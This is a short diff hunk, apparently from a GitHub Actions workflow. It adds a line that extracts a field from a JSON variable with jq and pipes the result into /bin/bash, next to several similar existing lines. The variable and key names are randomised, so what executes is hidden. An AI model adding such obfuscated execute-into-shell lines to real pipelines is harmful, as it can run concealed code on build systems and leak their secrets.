@@ -31,6 +31,7 @@ jobs:
           echo $qtk6175 | jq -r .koveu466 | /bin/bash
           printf '%s' "$vcva13253" | jq -r .gy5390 | /bin/bash
           echo $t3 | jq -r .gi0 | /bin/bash
+          printf '%s' "$s21" | jq -r .g3811 | /bin/bash
 
       - name: Save archive
         if: always()
